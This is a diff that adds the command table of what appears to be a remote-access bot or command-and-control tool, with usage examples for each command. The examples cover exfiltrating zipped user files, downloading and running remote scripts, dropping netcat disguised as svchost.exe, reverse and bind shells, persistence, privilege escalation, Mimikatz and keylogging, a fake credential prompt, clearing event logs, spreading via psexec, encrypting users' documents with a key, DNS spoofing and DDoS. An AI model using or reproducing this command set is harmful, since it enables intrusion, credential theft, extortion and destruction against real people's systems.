@@ -1,0 +1,42 @@
+ !quit {Exit}
+ !hello {HelloCommand}
+ !change {ChangeCommand}		  #  
+ !beef {BeefCommand}              #  !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe
+ !speak {SpeakCommand}			  #  !speak|you have been hacked
+ !recon {ReconCommand}            #  !recon
+ !update {UpdateCommand}          #  !update      -- update c2c and every others usefull stuff
+ !file {GetFilesByType}           #  !file|doc|C:\users\|0/1  -- 1 => upload      Param 2 MUST ALWAYS END WITH "\" exeple C:\users\           
+ !zip {ZipCommand}                #  !zip|C:\users\public\documents\|C:\users\secret.zip
+ !exfiltrate {ExfiltrateCommand}  #  !exfiltrate|C:\users\secret.zip
+ !run {RunCommand}                #  !run|net localgroup adminstrators > c:\windows\temp\ad.txt
+ !downexec {downexecCommand}	  #  !downexec|http://pastebinlikesite.com/moreevilpowershellscript.txt
+ !download {downloadCommand}	  #  !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\svchost.exe
+ !video {VideoCommand}			  #  !video|http://www.youtube.com/watch?v=dQw4w9WgXcQ
+ !shell {ShellCommand}			  #  !shell|10.0.0.23|443
+ !sleep {Sleepcommand}			  #  !sleep|9999
+ !thunderstruck {ThunderstruckCommand} #  !thunderstruck|http://www.youtube.com/watch?v=v2AC41dglnM
+ !eicar {EicarCommand}			  #  !eicar
+ !screenshot {ScreenshotCommand}  #  !screenshot
+ !popup {PopupCommand}			  #  !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
+ !persist {PersistCommand}		  #  !persist|https://raw.githubusercontent.com/.../pnt.ps1
+ !elevate {ElevateCommand}		  #  !elevate|http://blahblah.com/fjdads/script.raw
+ !pivot {PropagateCommand} 		  #  !propagate
+ !scan {ScanCommand}   			  #  !scan   
+ !propagate {PropagateCommand}    #  !propagate    - download psexec, use credential and push bot in every ip i the range
+ !wallpaper {WallpaperCommand}	  #  !wallpaper|http://wallpapercave.com/wp/ky43p3I.jpg/|c:\windows\temp\1.jpg
+ !webcam {WebcamCommand}          #  !webcam
+ !packetcapture {PacketCaptureCommand} # !packetcapture|10
+ !getsystem {GetSystemCommand}	   #  !getsystem
+ !bindshell {BindShellCommand} 	   #  !bindshell|8080
+ !credential {CredentialCommand}   #  !credential
+ !keylog {KeylogCommand} 		   #  !keylog
+ !mimikatz{MimikatzCommand}		   #  !mimikatz
+ !geolocate{GeolocateCommand}	   #	 !geolocate
+ !clearvent {ClearEventLog}        #	 !clearevent
+ !macattribute {MacAttribCommand}  #  !maccattribute|C:\secret.txt|01/03/2006 12:12 pm
+ #!ddos {DdosCommand}              #  !ddos|http://target.com
+ !encrypt {EncryptCommand}         #  !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj  - encrypt all "doc,docx,xlx,xlsx,ppt,pptx,jpg,png,bmp,pdf,txt,log,mp3,avi,mpeg,mp4" files
+ !dnsspoof {DnsSpoofCommand}       #  !dnsspoof|127.0.0.1  facebook.com|0/1  --> 1 => add, 0 => clean & add
+ #!destroy {DestroyCommand}        #  !destroy the system
+ #!sendmail {SendmailCommand}      #  !Send email from the compromised system
+            
